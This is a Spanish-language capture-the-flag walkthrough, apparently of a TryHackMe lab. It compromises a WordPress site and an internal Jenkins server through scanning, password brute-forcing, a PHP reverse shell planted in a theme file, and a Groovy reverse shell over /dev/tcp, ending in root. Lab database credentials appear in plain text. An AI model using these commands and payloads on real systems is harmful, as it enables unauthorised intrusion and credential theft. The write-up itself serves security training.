1. **Modificar el archivo /etc/hosts**

       - IP internal.thm

2. **Nmap** 

       - sudo nmap -sV -sC -Pn -v 10.10.17.84 -o port_scan

3. **Uso de dirb**
 ````
---- Scanning URL: http://10.10.17.84/ ----
==> DIRECTORY: http://10.10.17.84/blog/
+ http://10.10.17.84/index.html (CODE:200|SIZE:10918)
==> DIRECTORY: http://10.10.17.84/javascript/
==> DIRECTORY: http://10.10.17.84/phpmyadmin/
+ http://10.10.17.84/server-status (CODE:403|SIZE:276)
==> DIRECTORY: http://10.10.17.84/wordpress/
 ````

4. **Escaneo en Wordpress**
 ````
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 
[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a f>
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
  ````
5. **Fuerza bruta en Wordpress**

        - wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
        ````
        [!] Valid Combinations Found:
        | Username: admin, Password: *******
        Correo: admin@internal.thm
        ````
6. **Creamos una reverse shell en Wordpress**

        -  Vamos a los temas
        - Customize
        - Inyectamos en 404.php la reverse shell --> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
        - Nos conectamos: http://10.10.17.84/wordpress/wp-content/themes/twentyseventeen/404.php
        - Estamos a la escucha: nc -lvp 4444
7. **Usuario phpmyadmin**

        - Encontramos un usuario pero no podemo acceder a su directorio. Seguimos buscando:
        - En /etc/phmyadmin encontramos unas credenciales:
                -- cat config-db.php
                
         ````
         <?php
        ##
        ## database access settings in php format
        ## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
        ## by /usr/sbin/dbconfig-generate-include
        ##
        ## by default this file is managed via ucf, so you shouldn't have to
        ## worry about manual changes being silently discarded.  *however*,
        ## you'll probably also want to edit the configuration file mentioned
        ## above too.
        ##
        $dbuser='phpmyadmin';
        $dbpass='B2Ud4fEOZmVq';
        ````
        
8.  **Accedemos y no se encuentra nada.**
9. **Tras una larga busqueda de versiones, exploits, etc. Encontramos en el directorio /opt un .txt con credenciales.**
        
        - aubreanna:*****

10. **Nos conectamos por SSH y nos encontramos con el archivo jenkins.txt:**
        
         Internal Jenkins service is running on 172.17.0.2:8080

11. **Creamos un proxy socks para ver que nos encontramos**
        . ssh -D "10101" -q -N -f aubreanna@10.10.17.84
        . Configuramos el proxy en firefox y nos conectamos.
        . Nos encontramos un login de jenkins.
        
12. **Realizamos un ataque de fuerza bruta contra el servicio**

        - proxychains hydra 172.17.0.2 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or >
        
        - Contraseña encontrada:
        ````
       [proxychains] Strict chain  ...  127.0.0.1:10101  ...  172.17.0.2:8080 [proxychains] Strict chain  ...  127.0.0.1:10101  ...  172.17.0.2:8080 [8080]            [http-post-form] host: 172.17.0.2
       login: admin   password: *******
       [STATUS] attack finished for 172.17.0.2 (valid pair found)
       1 of 1 target successfully completed, 1 valid password found
       ````
13. **Creamos una reverse shell en jenkins.**

        - Manage --> Script console
        - Groovy script:
     
       ````
       r = Runtime.getRuntime()
       p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.84/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
       p.waitFor()
       ````


14. **Tenemos una shell como usuario jenkins.**

        - En el directorio /opt --> note.txt
        - root:*******

15. **Accedemos por ssh**

        - root.txt
        - Obtenemos la flag: ***********


